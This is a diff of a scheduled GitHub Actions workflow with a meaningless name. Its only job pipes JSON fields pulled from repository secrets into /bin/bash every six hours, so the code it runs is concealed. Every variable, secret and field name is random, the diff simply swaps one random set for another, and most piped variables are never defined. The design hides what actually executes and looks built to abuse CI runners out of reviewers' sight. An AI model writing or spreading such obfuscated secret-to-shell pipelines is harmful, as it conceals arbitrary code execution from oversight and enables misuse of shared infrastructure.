@@ -3,26 +3,23 @@ name: housinguntidy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 0/6 * * *'
-jobs:  # 4821
+    - cron: '58 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: housinguntidy
         env:
-          qrea6777: ${{ secrets.qrea6777 }}
+          cok79348: ${{ secrets.cok79348 }}
         run: |
-          echo $qrea6777 | jq -r .uclb55159 | /bin/bash
-          echo $yqdc13742 | jq -r .n6586 | /bin/bash
-          echo $ztbns35138 | jq -r .r137 | /bin/bash
-          echo $txlk06 | jq -r .cq7 | /bin/bash
-          echo $uwka9 | jq -r .fau7736 | /bin/bash
-          echo $tjo0017 | jq -r .rxarc81259 | /bin/bash
-          echo $ri89 | jq -r .c17 | /bin/bash
-          echo $wazy6947 | jq -r .gp1 | /bin/bash
-          echo $h81 | jq -r .a3939 | /bin/bash
-          echo $f9479 | jq -r .j995 | /bin/bash
-          echo $jukyj95090 | jq -r .ovgru028 | /bin/bash
-          echo $p059 | jq -r .jwp22913 | /bin/bash
+          echo $cok79348 | jq -r .xiwax917 | /bin/bash
+          echo $rxc85571 | jq -r .skj078 | /bin/bash
+          echo $awem390 | jq -r .dmil54 | /bin/bash
+          echo $n37155 | jq -r .rvj94623 | /bin/bash
+          echo $pal89080 | jq -r .ebwua0968 | /bin/bash
+          echo $a252 | jq -r .crds14732 | /bin/bash
+          echo $kfzp659 | jq -r .ct096 | /bin/bash
+          echo $vcs81130 | jq -r .sh06028 | /bin/bash
+          echo $pqa01036 | jq -r .kbopu49 | /bin/bash
 
